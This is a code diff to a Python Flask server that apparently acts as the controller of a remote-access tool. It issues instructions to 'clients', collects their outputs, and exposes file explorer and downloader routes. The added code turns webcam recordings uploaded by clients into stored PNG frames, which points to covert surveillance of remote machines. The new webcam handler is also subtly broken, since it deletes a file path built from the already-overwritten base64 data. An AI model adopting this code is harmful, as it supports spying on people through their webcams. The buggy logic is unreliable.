@@ -7,6 +7,10 @@ import json
 import time
 import os
 
+import io
+import cv2
+import base64
+
 os.chdir("/home/0x3af72/web")
 
 app = Flask(__name__)
@@ -148,7 +152,14 @@ def get_output():
     if not authenticated():
         return redirect("/file_explorer/", code=302)
     client = request.args.get("u")
-    return json.dumps(instruction_outputs[client])
+    last_id = request.args.get("last")
+    # cut off from last id
+    return_dict = {}
+    for instruction_id in instruction_outputs[client]:
+        return_dict[instruction_id] = instruction_outputs[client][instruction_id]
+        if instruction_id == last_id:
+            return_dict.clear()
+    return json.dumps(return_dict)
 
 # public: must be secure
 @app.route("/file_downloader/", methods=["GET"])
@@ -208,6 +219,28 @@ def outputs():
     contents = request.json
     if contents["instruction_id"] in instruction_outputs[client]:
         return ""
+
+    # for special case of webcam avi
+    if contents["type"] == "webcam":
+        print("SHOULDBFILEID:", contents['data'])
+        video = cv2.VideoCapture(f"files/user_temp_{contents['data']}.file")
+        _, frame = video.read()
+        _, buffer = cv2.imencode('.png', frame)
+        contents["data"] = base64.b64encode(buffer).decode()
+        video.release()
+        os.remove(f"files/user_temp_{contents['data']}.file")
+
     instruction_outputs[client][contents["instruction_id"]] = (contents["type"], contents["data"])
     write_json("instruction_outputs.json", instruction_outputs)
     return ""
+
+
+
+
+
+
+
+
+
+
+
